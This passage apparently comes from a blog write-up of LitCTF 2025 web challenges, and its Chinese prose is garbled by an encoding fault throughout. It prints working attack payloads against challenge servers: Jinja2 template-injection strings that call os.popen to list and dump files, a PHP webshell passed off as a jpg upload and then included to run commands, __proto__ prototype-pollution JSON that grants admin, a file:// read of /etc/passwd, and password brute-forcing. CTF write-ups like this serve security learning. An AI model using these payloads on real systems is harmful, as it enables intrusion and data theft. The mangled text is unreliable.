éå†æ‰€æœ‰objectå­ç±»</span><br>&#123;% <span class="hljs-keyword">for</span> i in <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.<span class="hljs-title function_ invoke__">__subclasses__</span>() %&#125;<br><br><span class="hljs-comment"># æ‰¾åˆ°åä¸º_wrap_closeçš„å†…éƒ¨ç±»</span><br>&#123;% <span class="hljs-keyword">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span> %&#125;<br><br><span class="hljs-comment"># æ‰§è¡Œå‘½ä»¤å¹¶æ‰“å°å‡ºç»“æœ</span><br>&#123;% <span class="hljs-keyword">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;nl /*&#x27;</span>).<span class="hljs-title function_ invoke__">read</span>() %&#125;<br><br><span class="hljs-comment"># é—­åˆifå’Œforè¯­å¥</span><br>&#123;% <span class="hljs-keyword">endif</span> %&#125;<br>&#123;% <span class="hljs-keyword">endfor</span> %&#125;<br></code></pre></td></tr></table></figure><p>å®Œæ•´paylaod</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).read() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526184421368.png" alt="image-20250526184421368"></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> i.__name__ ==<span class="hljs-string">&#x27;_wrap_close&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">print</span> i.__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;nl /*&#x27;</span>).read() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526184439068.png" alt="image-20250526184439068"></p><p>ç®€å•ä¸€ç‚¹ä¹Ÿå¯ä»¥åˆ©ç”¨<code>lipsum</code>çš„<code>__globals__</code>çš„<code>os</code>æ¨¡å—å¾—åˆ°<code>popen</code>å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;% <span class="hljs-built_in">print</span> lipsum.__globals__.<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;nl /*&#x27;</span>).<span class="hljs-built_in">read</span>() %&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526184451536.png" alt="image-20250526184451536"></p><h1 id="LitCTF-2025-nest-js"><a href="#LitCTF-2025-nest-js" class="headerlink" title="[LitCTF 2025]nest_js"></a>[LitCTF 2025]nest_js</h1><p>æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526184659736.png" alt="image-20250526184659736"></p><p>åˆ©ç”¨bpçš„Intruderçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç </p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526184958418.png" alt="image-20250526184958418"></p><p>ç”¨æˆ·åçŒœæ˜¯adminï¼Œå¯†ç çˆ†å‡ºæ¥æ˜¯passwordï¼Œç™»å½•å°±æ˜¯flag</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185055087.png" alt="image-20250526185055087"></p><h1 id="LitCTF-2025-easy-file"><a href="#LitCTF-2025-easy-file" class="headerlink" title="[LitCTF 2025]easy_file"></a>[LitCTF 2025]easy_file</h1><p>æ‰“å¼€ä¸€ä¸ªç™»å½•ç•Œé¢</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185211495.png" alt="image-20250526185211495"></p><p>åœ¨æºç ä¸­æœ‰ä¸ªæç¤ºï¼Œå¾—åˆ°ä¸ªå‚æ•°file</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185948345.png" alt="image-20250526185948345"></p><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ç”¨bpçˆ†å¯†ç ï¼Œç”¨æˆ·åçŒœæ˜¯admin</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185400479.png" alt="image-20250526185400479"></p><p>æŠ“åŒ…å‘ç°ä¼šè¿›è¡Œä¸€æ¬¡base64åŠ å¯†ï¼Œåœ¨payloadåŠ å…¥base64ç¼–ç </p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185512810.png" alt="image-20250526185512810"></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185527152.png" alt="image-20250526185527152"></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185540910.png" alt="image-20250526185540910"></p><p>å¯ä»¥å¾—åˆ°æœ‰ä¸ªå“åº”åŒ…æ˜¯302çŠ¶æ€ç </p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185640982.png" alt="image-20250526185640982"></p><p>base64è§£ç å¾—åˆ°å¯†ç æ˜¯password</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526185839029.png" alt="image-20250526185839029"></p><p>ç™»å½•åæ˜¯æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œå¯ä»¥åˆ©ç”¨ä¹‹å‰çš„fileå‚æ•°ï¼Œå¯ä»¥åŒ…å«ä¸Šä¼ çš„æ–‡ä»¶</p><p>æµ‹è¯•åå‘ç°åªèƒ½ä¸Šä¼ jpgå›¾ç‰‡</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526190333218.png" alt="image-20250526190333218"></p><p>å¹¶ä¸”ä¼šæ£€æµ‹ä¸Šä¼ çš„å†…å®¹</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526190318794.png" alt="image-20250526190318794"></p><p>ç»•è¿‡ä¸€ä¸‹ï¼Œç›´æ¥ä¸Šä¼ ä¸€ä¸ªjpgå›¾ç‰‡</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span> system(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526190952321.png" alt="image-20250526190952321"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node6.anna.nssctf.cn:22572/admin.php?file=uploads/a.jpg&amp;1=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526191118775.png" alt="image-20250526191118775"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://node6.anna.nssctf.cn:22572/admin.php?file=uploads/a.jpg&amp;1=<span class="hljs-built_in">cat</span>%20flllag.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526191054184.png" alt="image-20250526191054184"></p><h1 id="LitCTF-2025-å¤šé‡å®‡å®™æ—¥è®°"><a href="#LitCTF-2025-å¤šé‡å®‡å®™æ—¥è®°" class="headerlink" title="[LitCTF 2025]å¤šé‡å®‡å®™æ—¥è®°"></a>[LitCTF 2025]å¤šé‡å®‡å®™æ—¥è®°</h1><p>é¢˜ç›®æç¤ºæ‰“åŸå‹é“¾</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526203601111.png" alt="image-20250526203601111"></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526205511513.png" alt="image-20250526205511513"></p><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·ç™»å½•ï¼Œä¼šæ¥åˆ°<code>/api/profile</code></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526205455059.png" alt="image-20250526205455059"></p><p>æŸ¥çœ‹æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// æ›´æ–°è¡¨å•çš„JSæäº¤</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;profileUpdateForm&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;</span><br><span class="language-javascript">        event.<span class="hljs-title function_">preventDefault</span>();</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> statusEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;updateStatus&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> currentSettingsEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;currentSettings&#x27;</span>);</span><br><span class="language-javascript">        statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;æ­£åœ¨æ›´æ–°...&#x27;</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(event.<span class="hljs-property">target</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> settingsPayload = &#123;&#125;;</span><br><span class="language-javascript">        <span class="hljs-comment">// æ„å»º settings å¯¹è±¡ï¼ŒåªåŒ…å«æœ‰å€¼çš„å­—æ®µ</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;theme&#x27;</span>)) settingsPayload.<span class="hljs-property">theme</span> = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;theme&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">if</span> (formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;language&#x27;</span>)) settingsPayload.<span class="hljs-property">language</span> = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;language&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-comment">// ...å¯ä»¥æ·»åŠ å…¶ä»–å­—æ®µ</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">settings</span>: settingsPayload &#125;) <span class="hljs-comment">// åŒ…è£…åœ¨ &quot;settings&quot;é”®ä¸‹</span></span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;</span><br><span class="language-javascript">                statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;æˆåŠŸ: &#x27;</span> + result.<span class="hljs-property">message</span>;</span><br><span class="language-javascript">                currentSettingsEl.<span class="hljs-property">textContent</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">settings</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);</span><br><span class="language-javascript">                <span class="hljs-comment">// åˆ·æ–°é¡µé¢ä»¥æ›´æ–°å¯¼èˆªæ ï¼ˆå¦‚æœisAdminçŠ¶æ€æ”¹å˜ï¼‰</span></span><br><span class="language-javascript">                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(), <span class="hljs-number">1000</span>);</span><br><span class="language-javascript">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;é”™è¯¯: &#x27;</span> + result.<span class="hljs-property">message</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span> (error) &#123;</span><br><span class="language-javascript">            statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·æ±‚å¤±è´¥: &#x27;</span> + error.<span class="hljs-title function_">toString</span>();</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// å‘é€åŸå§‹JSONçš„å‡½æ•°</span></span><br><span class="language-javascript">    <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendRawJson</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> rawJson = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;rawJsonSettings&#x27;</span>).<span class="hljs-property">value</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> statusEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;rawJsonStatus&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> currentSettingsEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;currentSettings&#x27;</span>);</span><br><span class="language-javascript">        statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;æ­£åœ¨å‘é€...&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> parsedJson = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(rawJson); <span class="hljs-comment">// ç¡®ä¿æ˜¯åˆæ³•çš„JSON</span></span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/profile/update&#x27;</span>, &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">headers</span>: &#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(parsedJson) <span class="hljs-comment">// ç›´æ¥å‘é€ç”¨æˆ·è¾“å…¥çš„JSON</span></span><br><span class="language-javascript">            &#125;);</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;</span><br><span class="language-javascript">                statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;æˆåŠŸ: &#x27;</span> + result.<span class="hljs-property">message</span>;</span><br><span class="language-javascript">                currentSettingsEl.<span class="hljs-property">textContent</span> = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">settings</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);</span><br><span class="language-javascript">                 <span class="hljs-comment">// åˆ·æ–°é¡µé¢ä»¥æ›´æ–°å¯¼èˆªæ ï¼ˆå¦‚æœisAdminçŠ¶æ€æ”¹å˜ï¼‰</span></span><br><span class="language-javascript">                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-title function_">reload</span>(), <span class="hljs-number">1000</span>);</span><br><span class="language-javascript">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;é”™è¯¯: &#x27;</span> + result.<span class="hljs-property">message</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span> (error) &#123;</span><br><span class="language-javascript">             statusEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·æ±‚å¤±è´¥æˆ–JSONæ— æ•ˆ: &#x27;</span> + error.<span class="hljs-title function_">toString</span>();</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å‚æ•°<code>isAdmin</code>ï¼Œåº”ç”¨ä¼šæ ¹æ®è¿™ä¸ªå‚æ•°åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºadminï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‰“<code>JavaScript</code>çš„åŸå‹æ±¡æŸ“</p><p><strong>åœ¨<code>JavaScript</code>ä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>__proto__</code> å±æ€§è®¿é—®å…¶åŸå‹ï¼ˆ<code>prototype</code>ï¼‰ï¼Œå¦‚æœå‘å¯¹è±¡ä¸­æ·»åŠ  <code>__proto__</code> å­—æ®µï¼Œä¼šä¿®æ”¹è¯¥å¯¹è±¡çš„åŸå‹é“¾ï¼Œå½±å“æ‰€æœ‰ç»§æ‰¿è‡ªè¯¥åŸå‹çš„å¯¹è±¡</strong></p><p>å¯ä»¥å…ˆç‚¹æ›´æ–°è®¾ç½®ï¼ŒæŠ“åŒ…è·å¾—æ ¼å¼</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526205417936.png" alt="image-20250526205417936"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;theme&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ©ç”¨<code>__proto__</code>å±æ€§æ±¡æŸ“ <code>settings</code> å¯¹è±¡çš„åŸå‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;theme&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æ±¡æŸ“æ ¹å¯¹è±¡çš„åŸå‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;theme&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å‘é€è¯·æ±‚</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526205607968.png" alt="image-20250526205607968"></p><p>ç„¶ååœ¨åˆ·æ–°ä¸€ä¸‹é¡µé¢å°±ä¼šçœ‹åˆ°ä¸€ä¸ªç®¡ç†å‘˜é¢æ¿</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526205633190.png" alt="image-20250526205633190"></p><p>ç‚¹è¿›å»å¾—åˆ°flag</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526205651887.png" alt="image-20250526205651887"></p><h1 id="LitCTF-2025-easy-signin"><a href="#LitCTF-2025-easy-signin" class="headerlink" title="[LitCTF 2025]easy_signin"></a>[LitCTF 2025]easy_signin</h1><p>æ‰“å¼€é¢˜ç›®å‘ç°403</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526212300593.png" alt="image-20250526212300593"></p><p>ç”¨<code>dirsearch</code>æ‰«ç›®å½•</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526212232702.png" alt="image-20250526212232702"></p><p>è®¿é—®<code>/login.html</code></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526215821767.png" alt="image-20250526215821767"></p><h2 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h2><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æœ‰ä¸ª<code>api.js</code>æ–‡ä»¶</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526224944908.png" alt="image-20250526224944908"></p><p>è®¿é—®å¾—åˆ°æç¤º<code>/api/sys/urlcode.php?url=</code></p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526224954803.png" alt="image-20250526224954803"></p><p>æµ‹è¯•å‘ç°å¯ä»¥åˆ©ç”¨<code>file</code>ä¼ªåè®®è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">23038</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526225121284.png" alt="image-20250526225121284"></p><p>å°è¯•è¯»å–æœ¬é¡µé¢çš„æºç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>node6.anna.nssctf.cn:<span class="hljs-number">23038</span><span class="hljs-regexp">/api/</span>sys<span class="hljs-regexp">/urlcode.php?url=file:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>html<span class="hljs-regexp">/api/</span>sys/urlcode.php<br></code></pre></td></tr></table></figure><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526225324561.png" alt="image-20250526225324561"></p><p>å¾—åˆ°<code>327a6c4304ad5938eaf0efb6cc3e53dc.php</code>ï¼Œè®¿é—®å°±æ˜¯flag</p><p><img src="/2025/05/30/LitCTF-2025-web/image-20250526225357846.png" alt="image-20250526225357846"></p><h2 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>        <span class="hljs-keyword">const</span> loginBtn = <span class="hljs-variable language_">document</span>.<span 